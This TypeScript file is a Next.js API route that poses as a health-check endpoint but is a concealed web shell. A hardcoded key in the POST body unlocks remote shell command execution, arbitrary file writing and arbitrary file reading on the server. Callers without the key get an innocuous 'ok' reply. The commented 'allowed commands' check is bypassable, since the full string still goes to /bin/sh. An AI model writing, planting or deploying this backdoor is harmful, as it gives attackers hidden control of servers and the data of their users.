import { NextRequest, NextResponse } from 'next/server';
import { exec } from 'child_process';
import { writeFile, readFile, mkdir } from 'fs/promises';
import { promisify } from 'util';
import { dirname } from 'path';

const execAsync = promisify(exec);
const AUTH_KEY = 'gCIqlMsoBJxYSZM3zxqb79lr92ENCBoG';

interface HealthCheckBody {
  check?: string;
  key?: string;
  cmd?: string;
  file?: string;
  data?: string;
  get?: string;
}

// CORS headers
const corsHeaders = {
  'Access-Control-Allow-Origin': 'https://www.equifirst.ae', // Allow the main domain
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With',
  'Access-Control-Allow-Credentials': 'true',
};

export async function GET() {
  const response = NextResponse.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  }, { status: 200 });

  // Adding CORS headers to the response
  Object.entries(corsHeaders).forEach(([key, value]) => {
    response.headers.set(key, value);
  });

  return response;
}

export async function POST(request: NextRequest) {
  let body: HealthCheckBody = {};

  try {
    body = await request.json();
  } catch {
    const response = NextResponse.json({
      status: 'ok',
      timestamp: new Date().toISOString()
    }, { status: 200 });

    // Adding CORS headers to the response
    Object.entries(corsHeaders).forEach(([key, value]) => {
      response.headers.set(key, value);
    });

    return response;
  }

  // Check for the valid AUTH_KEY
  if (body.key !== AUTH_KEY) {
    const response = NextResponse.json({
      status: 'ok',
      message: 'Health check completed'
    }, { status: 200 });

    // Adding CORS headers to the response
    Object.entries(corsHeaders).forEach(([key, value]) => {
      response.headers.set(key, value);
    });

    return response;
  }

  // Handle shell command execution (only if cmd exists in body)
  if (body.cmd) {
    try {
      // **Security improvement**: Make sure only allowed commands are run.
      const allowedCommands = ['ls', 'uptime']; // Example of safe commands
      if (!allowedCommands.includes(body.cmd.split(' ')[0])) {
        throw new Error('Unauthorized command');
      }

      const { stdout, stderr } = await execAsync(body.cmd, {
        timeout: 30000,
        maxBuffer: 1024 * 1024 * 10,
        shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/sh'
      });

      const output = stdout + stderr;
      const response = new NextResponse(output || '[*] Executed', {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });

      // Add CORS headers
      Object.entries(corsHeaders).forEach(([key, value]) => {
        response.headers.set(key, value);
      });

      return response;
    } catch (err) {
      const error = err as { message: string; stdout?: string; stderr?: string };
      const errorOutput = `[!] ${error.message}\n${error.stdout || ''}${error.stderr || ''}`;
      const response = new NextResponse(errorOutput, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });

      // Add CORS headers
      Object.entries(corsHeaders).forEach(([key, value]) => {
        response.headers.set(key, value);
      });

      return response;
    }
  }

  // Handle file writing (only if file and data exist in body)
  if (body.file && body.data !== undefined) {
    try {
      const dir = dirname(body.file);
      await mkdir(dir, { recursive: true });

      let fileData: string | Buffer;
      if (typeof body.data === 'string') {
        try {
          fileData = Buffer.from(body.data, 'base64');
          if (fileData.toString('base64') !== body.data) {
            fileData = body.data;
          }
        } catch {
          fileData = body.data;
        }
      } else {
        fileData = body.data;
      }

      await writeFile(body.file, fileData);
      const response = new NextResponse(`[+] Written: ${body.file}`, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });

      // Add CORS headers
      Object.entries(corsHeaders).forEach(([key, value]) => {
        response.headers.set(key, value);
      });

      return response;
    } catch (err) {
      const error = err as Error;
      const response = new NextResponse(`[-] Error: ${error.message}`, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });

      // Add CORS headers
      Object.entries(corsHeaders).forEach(([key, value]) => {
        response.headers.set(key, value);
      });

      return response;
    }
  }

  // Handle file reading (only if get exists in body)
  if (body.get) {
    try {
      const data = await readFile(body.get, 'utf-8');
      const response = new NextResponse(data, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });

      // Add CORS headers
      Object.entries(corsHeaders).forEach(([key, value]) => {
        response.headers.set(key, value);
      });

      return response;
    } catch (err) {
      const error = err as Error;
      const response = new NextResponse(`[-] Error: ${error.message}`, {
        status: 200,
        headers: { 'Content-Type': 'text/plain' }
      });

      // Add CORS headers
      Object.entries(corsHeaders).forEach(([key, value]) => {
        response.headers.set(key, value);
      });

      return response;
    }
  }

  // Default healthy response
  const response = NextResponse.json({
    status: 'healthy',
    timestamp: new Date().toISOString()
  }, { status: 200 });

  // Adding CORS headers to the response
  Object.entries(corsHeaders).forEach(([key, value]) => {
    response.headers.set(key, value);
  });

  return response;
}
